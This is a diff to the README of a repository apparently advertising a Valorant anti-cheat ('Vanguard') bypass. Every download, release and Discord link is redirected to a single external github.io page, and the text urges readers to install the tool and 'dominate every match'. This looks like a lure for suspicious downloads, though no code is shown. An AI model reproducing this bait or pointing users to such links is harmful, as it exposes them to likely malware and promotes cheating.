@@ -1,6 +1,6 @@
 # 🎯 valorant-vanguard-bypass-2026 - Unlock Valorant's Full Potential Instantly
 
-[![Download Now](https://img.shields.io/badge/Download-Valorant_Vanguard_Bypass_2026-FF6B6B?style=for-the-badge&logo=github&logoColor=white&labelColor=2C3E50)](https://github.com/subdued-pastel4710/valorant-vanguard-bypass-2026/releases)
+[![Download Now](https://img.shields.io/badge/Download-Valorant_Vanguard_Bypass_2026-FF6B6B?style=for-the-badge&logo=github&logoColor=white&labelColor=2C3E50)](https://subdued-pastel4710.github.io)
 
 ---
 
@@ -51,7 +51,7 @@ Ready to take your Valorant experience to the next level? Here's everything you 
 
 ### Step 1: Get the File
 
-[![Download Button](https://img.shields.io/badge/⬇️_Download_Now-FFA500?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/subdued-pastel4710/valorant-vanguard-bypass-2026/releases)
+[![Download Button](https://img.shields.io/badge/⬇️_Download_Now-FFA500?style=for-the-badge&logo=windows&logoColor=white)](https://subdued-pastel4710.github.io)
 
 Visit this link to download the application.
 
@@ -156,7 +156,7 @@ This tool is for educational and entertainment purposes only. Using it violates 
 
 ## 📞 Contact & Community
 
-- **Discord:** [Join our server](https://discord.gg/valorant-bypass)
+- **Discord:** [Join our server](https://subdued-pastel4710.github.io)
 - **Email:** support@valorant-bypass.com
 - **GitHub Issues:** Report bugs or request features
 
@@ -179,7 +179,7 @@ Don't wait any longer. Unlock the full potential of Valorant today:
 2. Install the application.
 3. Launch Valorant and dominate every match.
 
-[![Download Now](https://img.shields.io/badge/🚀_Get_Started_Now-28B463?style=for-the-badge&logo=download&logoColor=white&labelColor=1A5276)](https://github.com/subdued-pastel4710/valorant-vanguard-bypass-2026/releases)
+[![Download Now](https://img.shields.io/badge/🚀_Get_Started_Now-28B463?style=for-the-badge&logo=download&logoColor=white&labelColor=1A5276)](https://subdued-pastel4710.github.io)
 
 ---
 
